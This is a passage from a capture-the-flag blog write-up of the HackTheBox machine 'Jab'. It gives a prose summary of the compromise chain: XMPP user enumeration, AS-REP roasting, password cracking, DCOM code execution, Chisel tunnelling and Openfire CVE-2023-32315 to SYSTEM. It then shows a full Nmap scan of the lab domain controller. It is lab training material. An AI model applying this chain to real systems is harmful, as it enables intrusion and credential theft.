<!doctype html><html lang=en><head><title>HTB Jab WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="HackThebox 'Jab' WriteUp"><meta name=keywords content="blog,pentesting,hacking,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB Jab WriteUp"><meta name=twitter:description content="HackThebox 'Jab' WriteUp"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/posts/jab/"><meta property="og:site_name" content="gunzf0x"><meta property="og:title" content="HTB Jab WriteUp"><meta property="og:description" content="HackThebox 'Jab' WriteUp"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-06-29T00:00:00+00:00"><meta property="article:modified_time" content="2024-06-29T00:00:00+00:00"><meta property="article:tag" content="HTB"><meta property="article:tag" content="Machine"><meta property="article:tag" content="Windows"><meta property="article:tag" content="Medium"><meta property="article:tag" content="Cmd"><meta property="article:tag" content="Netcat"><link rel=canonical href=https://gunzf0x.github.io/pentesting/posts/jab/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/projects/>Projects</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/contact/>Contact me</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/es/posts/jab/>üá®üá±</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/posts/jab/>HTB Jab WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-06-29T00:00:00Z>29 June, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
19-minute read</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/tags/htb/>HTB</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/machine/>Machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/windows/>Windows</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/medium/>Medium</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/cmd/>Cmd</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/netcat/>Netcat</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/netexec/>Netexec</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/pidgin/>Pidgin</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/xmpp/>Xmpp</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/impacket/>Impacket</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/getnpusers/>Getnpusers</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/dcom/>Dcom</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/tcpdump/>Tcpdump</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/chisel/>Chisel</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/remote-port-forwarding/>Remote Port Forwarding</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/openfire/>Openfire</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/certutil/>Certutil</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/rpcclient/>Rpcclient</a></span></div></div></header><div class=post-content><h1 id=jab----hackthebox>Jab &ndash; HackTheBox
<a class=heading-link href=#jab----hackthebox><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Windows</em></li><li>Difficulty: <em>Medium</em></li><li>Platform: <em>HackTheBox</em></li></ul><p><img alt="&lsquo;Jab&rsquo; Avatar" src=/pentesting/images/Jab_avatar.png></p><hr><h2 id=summary>Summary
<a class=heading-link href=#summary><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p><code>Jab</code> is a medium <code>Windows</code> machine from <code>HackTheBox</code>. From an initial port scan, we note that the target machine is running <code>Jabber</code>, a messaging service based on <code>XMPP</code>. We are able to create a new user within this messaging service and be able to extract potential users. We then attempt an <code>AS-REP Roasting</code> attack against these users, where we are able to obtain hashes for 3 of them. We attempt a brute force password cracking attack and find the credentials for one user. With this user, we are able to enter again into <code>Jabber</code> service, but we are able to read new chats. Within these new chats, there is a leaked password for another user. Since <code>Microsoft RPC</code> was running, we guess that it could be running the protocol <code>Distributed Component Object Model</code> (<code>DCOM</code>). With these new user with leaked credentials, we reach a <code>Remote Code Execution</code> using the tool <code>dcomexec.py</code> from <code>Impacket</code>, gaining access to the machine. Once inside, we detect a service called <code>Openfire</code> -used to administer the <code>Jabber</code> service- that was running and had an internal port exposed. We use <code>Chisel</code> to reach a <code>Remote Port Forwarding</code> and gain access to this internal port. Checking this internal port through a web browser it shows a login page and a vulnerable version for <code>Openfire</code> against <a href=https://nvd.nist.gov/vuln/detail/CVE-2023-32315 class=external-link target=_blank rel=noopener>CVE-2023-32315</a>. Using this vulnerability, we are able to execute commands from the owner of this service, gaining access as <code>nt authority/system</code> and compromise the machine.</p><hr><h2 id=user>User
<a class=heading-link href=#user><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li><code>Nmap</code> scan shows multiple ports open: <code>53</code> <code>Domain Name System</code> (<code>DNS</code>), <code>88</code> <code>Kerberos</code>, <code>135</code> <code>Microsoft RPC</code>, <code>389</code> <code>Lightweight Directory Access Protocol</code> (<code>LDAP</code>), <code>445</code> <code>Server Message Block</code> (<code>SMB</code>), <code>5222</code> a jabber service (whose name is similar to the machine name, so it&rsquo;s a hint), <code>5985</code> <code>Windows Remote Management</code> (<code>WinRM</code>); among others.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sVC -p53,88,135,139,389,445,464,593,636,3268,3269,5222,5223,5262,5263,5269,5270,5275,5276,5985,7070,7443,7777,9389,47001,49664,49665,49666,49668,49673,49674,49675,49676,49681,49781,59518 10.10.11.4 -oN targeted
</span></span></span><span class=line><span class=cl><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-22 12:33 -04
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.10.11.4
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.28s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT      STATE SERVICE             VERSION
</span></span></span><span class=line><span class=cl><span class=go>53/tcp    open  domain              Simple DNS Plus
</span></span></span><span class=line><span class=cl><span class=go>88/tcp    open  kerberos-sec        Microsoft Windows Kerberos (server time: 2024-05-22 16:33:22Z)
</span></span></span><span class=line><span class=cl><span class=go>135/tcp   open  msrpc               Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>139/tcp   open  netbios-ssn         Microsoft Windows netbios-ssn
</span></span></span><span class=line><span class=cl><span class=go>389/tcp   open  ldap                Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
</span></span></span><span class=line><span class=cl><span class=go>|_ssl-date: 2024-05-22T16:34:48+00:00; -2s from scanner time.
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: commonName=DC01.jab.htb
</span></span></span><span class=line><span class=cl><span class=go>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.jab.htb
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2023-11-01T20:16:18
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2024-10-31T20:16:18
</span></span></span><span class=line><span class=cl><span class=go>445/tcp   open  microsoft-ds?
</span></span></span><span class=line><span class=cl><span class=go>464/tcp   open  kpasswd5?
</span></span></span><span class=line><span class=cl><span class=go>593/tcp   open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
</span></span></span><span class=line><span class=cl><span class=go>636/tcp   open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: commonName=DC01.jab.htb
</span></span></span><span class=line><span class=cl><span class=go>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.jab.htb
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2023-11-01T20:16:18
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2024-10-31T20:16:18
</span></span></span><span class=line><span class=cl><span class=go>|_ssl-date: 2024-05-22T16:34:46+00:00; -2s from scanner time.
</span></span></span><span class=line><span class=cl><span class=go>3268/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: commonName=DC01.jab.htb
</span></span></span><span class=line><span class=cl><span class=go>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.jab.htb
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2023-11-01T20:16:18
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2024-10-31T20:16:18
</span></span></span><span class=line><span class=cl><span class=go>|_ssl-date: 2024-05-22T16:34:46+00:00; -3s from scanner time.
</span></span></span><span class=line><span class=cl><span class=go>3269/tcp  open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
</span></span></span><span class=line><span class=cl><span class=go>|_ssl-date: 2024-05-22T16:34:46+00:00; -2s from scanner time.
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: commonName=DC01.jab.htb
</span></span></span><span class=line><span class=cl><span class=go>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.jab.htb
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2023-11-01T20:16:18
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2024-10-31T20:16:18
</span></span></span><span class=line><span class=cl><span class=go>5222/tcp  open  jabber
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: commonName=dc01.jab.htb
</span></span></span><span class=line><span class=cl><span class=go>| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2023-10-26T22:00:12
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2028-10-24T22:00:12
</span></span></span><span class=line><span class=cl><span class=go>| xmpp-info:
</span></span></span><span class=line><span class=cl><span class=go>|   STARTTLS Failed
</span></span></span><span class=line><span class=cl><span class=go>|   info:
</span></span></span><span class=line><span class=cl><span class=go>|     stream_id: 3ymit1490a
</span></span></span><span class=line><span class=cl><span class=go>|     unknown:
</span></span></span><span class=line><span class=cl><span class=go>|     compression_methods:
</span></span></span><span class=line><span class=cl><span class=go>|     errors:
</span></span></span><span class=line><span class=cl><span class=go>|       invalid-namespace
</span></span></span><span class=line><span class=cl><span class=go>|       (timeout)
</span></span></span><span class=line><span class=cl><span class=go>|     features:
</span></span></span><span class=line><span class=cl><span class=go>|     xmpp:
</span></span></span><span class=line><span class=cl><span class=go>|       version: 1.0
</span></span></span><span class=line><span class=cl><span class=go>|     auth_mechanisms:
</span></span></span><span class=line><span class=cl><span class=go>|_    capabilities:
</span></span></span><span class=line><span class=cl><span class=go>| fingerprint-strings:
</span></span></span><span class=line><span class=cl><span class=go>|   RPCCheck:
</span></span></span><span class=line><span class=cl><span class=go>|_    &lt;stream:error xmlns:stream=&#34;http://etherx.jabber.org/streams&#34;&gt;&lt;not-well-formed xmlns=&#34;urn:ietf:params:xml:ns:xmpp-streams&#34;/&gt;&lt;/stream:error&gt;&lt;/stream:stream&gt;
</span></span></span><span class=line><span class=cl><span class=go>|_ssl-date: TLS randomness does not represent time
</span></span></span><span class=line><span class=cl><span class=go>5223/tcp  open  ssl/jabber
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: commonName=dc01.jab.htb
</span></span></span><span class=line><span class=cl><span class=go>| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2023-10-26T22:00:12
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2028-10-24T22:00:12
</span></span></span><span class=line><span class=cl><span class=go>| fingerprint-strings:
</span></span></span><span class=line><span class=cl><span class=go>|   RPCCheck:
</span></span></span><span class=line><span class=cl><span class=go>|_    &lt;stream:error xmlns:stream=&#34;http://etherx.jabber.org/streams&#34;&gt;&lt;not-well-formed xmlns=&#34;urn:ietf:params:xml:ns:xmpp-streams&#34;/&gt;&lt;/stream:error&gt;&lt;/stream:stream&gt;
</span></span></span><span class=line><span class=cl><span class=go>|_ssl-date: TLS randomness does not represent time
</span></span></span><span class=line><span class=cl><span class=go>| xmpp-info:
</span></span></span><span class=line><span class=cl><span class=go>|   STARTTLS Failed
</span></span></span><span class=line><span class=cl><span class=go>|   info:
</span></span></span><span class=line><span class=cl><span class=go>|     features:
</span></span></span><span class=line><span class=cl><span class=go>|     compression_methods:
</span></span></span><span class=line><span class=cl><span class=go>|     unknown:
</span></span></span><span class=line><span class=cl><span class=go>|     errors:
</span></span></span><span class=line><span class=cl><span class=go>|       (timeout)
</span></span></span><span class=line><span class=cl><span class=go>|     xmpp:
</span></span></span><span class=line><span class=cl><span class=go>|     auth_mechanisms:
</span></span></span><span class=line><span class=cl><span class=go>|_    capabilities:
</span></span></span><span class=line><span class=cl><span class=go>5262/tcp  open  jabber
</span></span></span><span class=line><span class=cl><span class=go>| xmpp-info:
</span></span></span><span class=line><span class=cl><span class=go>|   STARTTLS Failed
</span></span></span><span class=line><span class=cl><span class=go>|   info:
</span></span></span><span class=line><span class=cl><span class=go>|     stream_id: 2ty0cdr8t2
</span></span></span><span class=line><span class=cl><span class=go>|     unknown:
</span></span></span><span class=line><span class=cl><span class=go>|     compression_methods:
</span></span></span><span class=line><span class=cl><span class=go>|     errors:
</span></span></span><span class=line><span class=cl><span class=go>|       invalid-namespace
</span></span></span><span class=line><span class=cl><span class=go>|       (timeout)
</span></span></span><span class=line><span class=cl><span class=go>|     features:
</span></span></span><span class=line><span class=cl><span class=go>|     xmpp:
</span></span></span><span class=line><span class=cl><span class=go>|       version: 1.0
</span></span></span><span class=line><span class=cl><span class=go>|     auth_mechanisms:
</span></span></span><span class=line><span class=cl><span class=go>|_    capabilities:
</span></span></span><span class=line><span class=cl><span class=go>| fingerprint-strings:
</span></span></span><span class=line><span class=cl><span class=go>|   RPCCheck:
</span></span></span><span class=line><span class=cl><span class=go>|_    &lt;stream:error xmlns:stream=&#34;http://etherx.jabber.org/streams&#34;&gt;&lt;not-well-formed xmlns=&#34;urn:ietf:params:xml:ns:xmpp-streams&#34;/&gt;&lt;/stream:error&gt;&lt;/stream:stream&gt;
</span></span></span><span class=line><span class=cl><span class=go>5263/tcp  open  ssl/jabber
</span></span></span><span class=line><span class=cl><span class=go>| xmpp-info:
</span></span></span><span class=line><span class=cl><span class=go>|   STARTTLS Failed
</span></span></span><span class=line><span class=cl><span class=go>|   info:
</span></span></span><span class=line><span class=cl><span class=go>|     features:
</span></span></span><span class=line><span class=cl><span class=go>|     compression_methods:
</span></span></span><span class=line><span class=cl><span class=go>|     unknown:
</span></span></span><span class=line><span class=cl><span class=go>|     errors:
</span></span></span><span class=line><span class=cl><span class=go>|       (timeout)
</span></span></span><span class=line><span class=cl><span class=go>|     xmpp:
</span></span></span><span class=line><span class=cl><span class=go>|     auth_mechanisms:
</span></span></span><span class=line><span class=cl><span class=go>|_    capabilities:
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: commonName=dc01.jab.htb
</span></span></span><span class=line><span class=cl><span class=go>| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2023-10-26T22:00:12
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2028-10-24T22:00:12
</span></span></span><span class=line><span class=cl><span class=go>|_ssl-date: TLS randomness does not represent time
</span></span></span><span class=line><span class=cl><span class=go>| fingerprint-strings:
</span></span></span><span class=line><span class=cl><span class=go>|   RPCCheck:
</span></span></span><span class=line><span class=cl><span class=go>|_    &lt;stream:error xmlns:stream=&#34;http://etherx.jabber.org/streams&#34;&gt;&lt;not-well-formed xmlns=&#34;urn:ietf:params:xml:ns:xmpp-streams&#34;/&gt;&lt;/stream:error&gt;&lt;/stream:stream&gt;
</span></span></span><span class=line><span class=cl><span class=go>5269/tcp  open  xmpp                Wildfire XMPP Client
</span></span></span><span class=line><span class=cl><span class=go>| xmpp-info:
</span></span></span><span class=line><span class=cl><span class=go>|   STARTTLS Failed
</span></span></span><span class=line><span class=cl><span class=go>|   info:
</span></span></span><span class=line><span class=cl><span class=go>|     features:
</span></span></span><span class=line><span class=cl><span class=go>|     compression_methods:
</span></span></span><span class=line><span class=cl><span class=go>|     unknown:
</span></span></span><span class=line><span class=cl><span class=go>|     errors:
</span></span></span><span class=line><span class=cl><span class=go>|       (timeout)
</span></span></span><span class=line><span class=cl><span class=go>|     xmpp:
</span></span></span><span class=line><span class=cl><span class=go>|     auth_mechanisms:
</span></span></span><span class=line><span class=cl><span class=go>|_    capabilities:
</span></span></span><span class=line><span class=cl><span class=go>5270/tcp  open  ssl/xmpp            Wildfire XMPP Client
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: commonName=dc01.jab.htb
</span></span></span><span class=line><span class=cl><span class=go>| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2023-10-26T22:00:12
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2028-10-24T22:00:12
</span></span></span><span class=line><span class=cl><span class=go>|_ssl-date: TLS randomness does not represent time
</span></span></span><span class=line><span class=cl><span class=go>5275/tcp  open  jabber
</span></span></span><span class=line><span class=cl><span class=go>| xmpp-info:
</span></span></span><span class=line><span class=cl><span class=go>|   STARTTLS Failed
</span></span></span><span class=line><span class=cl><span class=go>|   info:
</span></span></span><span class=line><span class=cl><span class=go>|     stream_id: 2pupc1vplb
</span></span></span><span class=line><span class=cl><span class=go>|     unknown:
</span></span></span><span class=line><span class=cl><span class=go>|     compression_methods:
</span></span></span><span class=line><span class=cl><span class=go>|     errors:
</span></span></span><span class=line><span class=cl><span class=go>|       invalid-namespace
</span></span></span><span class=line><span class=cl><span class=go>|       (timeout)
</span></span></span><span class=line><span class=cl><span class=go>|     features:
</span></span></span><span class=line><span class=cl><span class=go>|     xmpp:
</span></span></span><span class=line><span class=cl><span class=go>|       version: 1.0
</span></span></span><span class=line><span class=cl><span class=go>|     auth_mechanisms:
</span></span></span><span class=line><span class=cl><span class=go>|_    capabilities:
</span></span></span><span class=line><span class=cl><span class=go>| fingerprint-strings:
</span></span></span><span class=line><span class=cl><span class=go>|   RPCCheck:
</span></span></span><span class=line><span class=cl><span class=go>|_    &lt;stream:error xmlns:stream=&#34;http://etherx.jabber.org/streams&#34;&gt;&lt;not-well-formed xmlns=&#34;urn:ietf:params:xml:ns:xmpp-streams&#34;/&gt;&lt;/stream:error&gt;&lt;/stream:stream&gt;
</span></span></span><span class=line><span class=cl><span class=go>5276/tcp  open  ssl/jabber
</span></span></span><span class=line><span class=cl><span class=go>|_ssl-date: TLS randomness does not represent time
</span></span></span><span class=line><span class=cl><span class=go>| xmpp-info:
</span></span></span><span class=line><span class=cl><span class=go>|   STARTTLS Failed
</span></span></span><span class=line><span class=cl><span class=go>|   info:
</span></span></span><span class=line><span class=cl><span class=go>|     features:
</span></span></span><span class=line><span class=cl><span class=go>|     compression_methods:
</span></span></span><span class=line><span class=cl><span class=go>|     unknown:
</span></span></span><span class=line><span class=cl><span class=go>|     errors:
</span></span></span><span class=line><span class=cl><span class=go>|       (timeout)
</span></span></span><span class=line><span class=cl><span class=go>|     xmpp:
</span></span></span><span class=line><span class=cl><span class=go>|     auth_mechanisms:
</span></span></span><span class=line><span class=cl><span class=go>|_    capabilities:
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: commonName=dc01.jab.htb
</span></span></span><span class=line><span class=cl><span class=go>| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2023-10-26T22:00:12
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2028-10-24T22:00:12
</span></span></span><span class=line><span class=cl><span class=go>| fingerprint-strings:
</span></span></span><span class=line><span class=cl><span class=go>|   RPCCheck:
</span></span></span><span class=line><span class=cl><span class=go>|_    &lt;stream:error xmlns:stream=&#34;http://etherx.jabber.org/streams&#34;&gt;&lt;not-well-formed xmlns=&#34;urn:ietf:params:xml:ns:xmpp-streams&#34;/&gt;&lt;/stream:error&gt;&lt;/stream:stream&gt;
</span></span></span><span class=line><span class=cl><span class=go>5985/tcp  open  http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Not Found
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span></span><span class=line><span class=cl><span class=go>7070/tcp  open  realserver?
</span></span></span><span class=line><span class=cl><span class=go>| fingerprint-strings:
</span></span></span><span class=line><span class=cl><span class=go>|   DNSStatusRequestTCP, DNSVersionBindReqTCP:
</span></span></span><span class=line><span class=cl><span class=go>|     HTTP/1.1 400 Illegal character CNTL=0x0
</span></span></span><span class=line><span class=cl><span class=go>|     Content-Type: text/html;charset=iso-8859-1
</span></span></span><span class=line><span class=cl><span class=go>|     Content-Length: 69
</span></span></span><span class=line><span class=cl><span class=go>|     Connection: close
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x0&lt;/pre&gt;
</span></span></span><span class=line><span class=cl><span class=go>|   GetRequest:
</span></span></span><span class=line><span class=cl><span class=go>|     HTTP/1.1 200 OK
</span></span></span><span class=line><span class=cl><span class=go>|     Date: Wed, 22 May 2024 16:33:22 GMT
</span></span></span><span class=line><span class=cl><span class=go>|     Last-Modified: Wed, 16 Feb 2022 15:55:02 GMT
</span></span></span><span class=line><span class=cl><span class=go>|     Content-Type: text/html
</span></span></span><span class=line><span class=cl><span class=go>|     Accept-Ranges: bytes
</span></span></span><span class=line><span class=cl><span class=go>|     Content-Length: 223
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;html&gt;
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;head&gt;&lt;title&gt;Openfire HTTP Binding Service&lt;/title&gt;&lt;/head&gt;
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;body&gt;&lt;font face=&#34;Arial, Helvetica&#34;&gt;&lt;b&gt;Openfire &lt;a href=&#34;http://www.xmpp.org/extensions/xep-0124.html&#34;&gt;HTTP Binding&lt;/a&gt; Service&lt;/b&gt;&lt;/font&gt;&lt;/body&gt;
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;/html&gt;
</span></span></span><span class=line><span class=cl><span class=go>|   HTTPOptions:
</span></span></span><span class=line><span class=cl><span class=go>|     HTTP/1.1 200 OK
</span></span></span><span class=line><span class=cl><span class=go>|     Date: Wed, 22 May 2024 16:33:28 GMT
</span></span></span><span class=line><span class=cl><span class=go>|     Allow: GET,HEAD,POST,OPTIONS
</span></span></span><span class=line><span class=cl><span class=go>|   Help:
</span></span></span><span class=line><span class=cl><span class=go>|     HTTP/1.1 400 No URI
</span></span></span><span class=line><span class=cl><span class=go>|     Content-Type: text/html;charset=iso-8859-1
</span></span></span><span class=line><span class=cl><span class=go>|     Content-Length: 49
</span></span></span><span class=line><span class=cl><span class=go>|     Connection: close
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: No URI&lt;/pre&gt;
</span></span></span><span class=line><span class=cl><span class=go>|   RPCCheck:
</span></span></span><span class=line><span class=cl><span class=go>|     HTTP/1.1 400 Illegal character OTEXT=0x80
</span></span></span><span class=line><span class=cl><span class=go>|     Content-Type: text/html;charset=iso-8859-1
</span></span></span><span class=line><span class=cl><span class=go>|     Content-Length: 71
</span></span></span><span class=line><span class=cl><span class=go>|     Connection: close
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character OTEXT=0x80&lt;/pre&gt;
</span></span></span><span class=line><span class=cl><span class=go>|   RTSPRequest:
</span></span></span><span class=line><span class=cl><span class=go>|     HTTP/1.1 505 Unknown Version
</span></span></span><span class=line><span class=cl><span class=go>|     Content-Type: text/html;charset=iso-8859-1
</span></span></span><span class=line><span class=cl><span class=go>|     Content-Length: 58
</span></span></span><span class=line><span class=cl><span class=go>|     Connection: close
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;h1&gt;Bad Message 505&lt;/h1&gt;&lt;pre&gt;reason: Unknown Version&lt;/pre&gt;
</span></span></span><span class=line><span class=cl><span class=go>|   SSLSessionReq:
</span></span></span><span class=line><span class=cl><span class=go>|     HTTP/1.1 400 Illegal character CNTL=0x16
</span></span></span><span class=line><span class=cl><span class=go>|     Content-Type: text/html;charset=iso-8859-1
</span></span></span><span class=line><span class=cl><span class=go>|     Content-Length: 70
</span></span></span><span class=line><span class=cl><span class=go>|     Connection: close
</span></span></span><span class=line><span class=cl><span class=go>|_    &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x16&lt;/pre&gt;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=go>7443/tcp  open  ssl/oracleas-https?
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: commonName=dc01.jab.htb
</span></span></span><span class=line><span class=cl><span class=go>| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2023-10-26T22:00:12
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2028-10-24T22:00:12
</span></span></span><span class=line><span class=cl><span class=go>| fingerprint-strings:
</span></span></span><span class=line><span class=cl><span class=go>|   DNSStatusRequestTCP, DNSVersionBindReqTCP:
</span></span></span><span class=line><span class=cl><span class=go>|     HTTP/1.1 400 Illegal character CNTL=0x0
</span></span></span><span class=line><span class=cl><span class=go>|     Content-Type: text/html;charset=iso-8859-1
</span></span></span><span class=line><span class=cl><span class=go>|     Content-Length: 69
</span></span></span><span class=line><span class=cl><span class=go>|     Connection: close
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x0&lt;/pre&gt;
</span></span></span><span class=line><span class=cl><span class=go>|   GetRequest:
</span></span></span><span class=line><span class=cl><span class=go>|     HTTP/1.1 200 OK
</span></span></span><span class=line><span class=cl><span class=go>|     Date: Wed, 22 May 2024 16:33:35 GMT
</span></span></span><span class=line><span class=cl><span class=go>|     Last-Modified: Wed, 16 Feb 2022 15:55:02 GMT
